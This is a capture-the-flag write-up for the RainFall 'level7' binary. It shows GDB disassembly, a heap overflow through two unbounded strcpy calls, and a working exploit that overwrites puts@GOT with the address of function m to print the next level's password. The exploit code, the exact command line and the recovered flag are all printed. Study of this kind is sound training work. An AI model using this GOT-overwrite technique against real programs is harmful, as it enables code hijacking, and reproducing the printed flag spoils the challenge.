# **Level7**

In this level, we found a binary file that takes two arguments:

```bash
level7@RainFall:~$ ./level7 eeee
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 eeee eeee
~~
level7@RainFall:~$
```

## **Binary Analysis**

Using GDB, we analyzed the binary and discovered that the `main` function allocates memory, copies input, and performs file operations:

```nasm
# First pair of mallocs
0x0804852a <+9>:     movl   $0x8,(%esp)        ; malloc(8) - struct1
0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
0x0804853e <+29>:    movl   $0x1,(%eax)        ; struct1->id = 1
0x08048544 <+35>:    movl   $0x8,(%esp)        ; malloc(8) - struct1->str
0x0804854b <+42>:    call   0x80483f0 <malloc@plt>

# Second pair of mallocs
0x08048559 <+56>:    movl   $0x8,(%esp)        ; malloc(8) - struct2
0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
0x0804856d <+76>:    movl   $0x2,(%eax)        ; struct2->id = 2
0x08048573 <+82>:    movl   $0x8,(%esp)        ; malloc(8) - struct2->str
0x0804857a <+89>:    call   0x80483f0 <malloc@plt>

# First strcpy
0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>   ; strcpy(struct1->str, argv[1])

# Second strcpy
0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>   ; strcpy(struct2->str, argv[2])

# File operations
0x080485c2 <+161>:	mov    $0x80486e9,%edx ; "r"
0x080485c7 <+166>:	mov    $0x80486eb,%eax ; "/home/user/level8/.pass"
0x080485d3 <+178>:   call   0x8048430 <fopen@plt>    ; fopen("/home/user/level8/.pass", "r")
0x080485eb <+202>:   call   0x80483c0 <fgets@plt>    ; fgets(global_buffer, 68, fp)
```

**Available Functions**

Listing all functions reveals another function, `m`, which prints the global buffer along with the current timestamp:

```nasm
0x080484f4 <m>:      push   %ebp
0x080484fa <+6>:     movl   $0x0,(%esp)
0x08048501 <+13>:    call   0x80483d0 <time@plt>
0x0804850b <+23>:    mov    %eax,0x8(%esp)
0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)     ; Global buffer
0x08048517 <+35>:    mov    %edx,(%esp)
0x0804851a <+38>:    call   0x80483b0 <printf@plt>   ; printf(format, buffer, time)
```

## **Vulnerability**

The program contains two vulnerabilities:

1. **Unsafe `strcpy`:** Both calls to `strcpy` allow heap overflow because they lack bounds checking.
2. **Global buffer overwrite:** Through heap overflow, the global buffer (`global_buffer`) can be overwritten.

## Exploit

**Exploitation Plan**

1. Use the first `strcpy` to overflow and overwrite the second struct's string pointer, pointing it to the GOT entry of `puts`.
2. Use the second `strcpy` to overwrite the GOT entry of `puts` with the address of function `m` , because `m` prints the same buffer `0x8049960` where `fgets` stores the contents read from the file `.pass`.
3. When `puts("~~")` is called, it will invoke `m` instead, which prints the password from the global buffer.

**Calculating the Offset**

To overwrite `struct2->str` we need to:

1. Fill `struct1->str` buffer (8 bytes).
2. Overwrite heap metadata (8 bytes).
3. Cross `struct2` until its pointer (4 bytes).

```python
# Target addresses
puts_got = "\x28\x99\x04\x08"    # Address of puts@GOT (0x08049928)
m_addr = "\xf4\x84\x04\x08"      # Address of function m (0x080484f4)

# First argument: Overflow to overwrite struct2 pointer
arg1 = "A" * 20 + puts_got       # 20 bytes padding + puts@GOT address

# Second argument: Address of function m
arg2 = m_addr
```

1. Run the exploit:
    
    ```bash
    ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    ```
    
2. Result:
    
    ```bash
    level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    ```
    

## **Flag**

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```